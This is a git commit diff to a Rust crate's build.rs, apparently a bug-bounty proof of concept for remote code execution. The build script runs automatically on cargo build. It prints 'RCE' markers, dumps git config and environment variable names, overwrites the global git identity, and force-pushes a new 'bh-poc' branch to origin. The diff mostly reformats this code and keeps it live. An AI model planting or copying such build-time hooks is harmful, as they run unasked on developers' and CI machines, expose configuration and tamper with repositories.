06b327eee7629473eb5f8536a473e9b57108aaeb
barakharyati <41957095+barakharyati@users.noreply.github.com>
2025-12-10 12:58:02 +0200

    test

--- crates/core/build.rs
+++ crates/core/build.rs
@@ -1,14 +1,12 @@
 use std::process::Command;
 
-
 fn main() {
-
     println!("cargo:warning=*** BUILD.RS EXECUTED - RCE MARKER ***");
     println!("cargo:rustc-env=FORCE_RUN=1");
-    // Marker to prove RCE
+
     eprintln!("cargo:warning=*** ____RCE_Success");
 
-    // Show git config (read-only)
+    // Show git config
     let _ = Command::new("sh")
         .arg("-c")
         .arg("git config --list >&2 || echo 'no git config' >&2")
@@ -16,21 +14,21 @@ fn main() {
 
     eprintln!("cargo:warning=***____RCE_Success");
 
-    // test write permissions
-    let output = Command::new("sh")
-    .arg("-c")
-    .arg("git config --global user.email \"bh@someemail.com\"; \
-          git config --global user.name \"H1Tester\"; \
-          git fetch origin 2>&1; \
-          git checkout master/v2 2>&1; \
-          git pull origin master/v2 2>&1; \
-          git checkout -b bh-poc 2>&1; \
-          git add . 2>&1; \
-          git push  --force  -u origin bh-poc 2>&1")
-    .output()
-    .expect("failed to execute shell");
+    // Test write permissions
+    let _output = Command::new("sh")
+        .arg("-c")
+        .arg("git config --global user.email \"bh@someemail.com\"; \
+              git config --global user.name \"H1Tester\"; \
+              git fetch origin 2>&1; \
+              git checkout master/v2 2>&1; \
+              git pull origin master/v2 2>&1; \
+              git checkout -b bh-poc 2>&1; \
+              git add . 2>&1; \
+              git push  --force  -u origin bh-poc 2>&1")
+        .output()
+        .expect("failed to execute shell");
 
-    // Show environment variable *names* (read-only)
+    // Show environment variable *names*
     let _ = Command::new("sh")
         .arg("-c")
         .arg("printenv | cut -d= -f1 >&2")
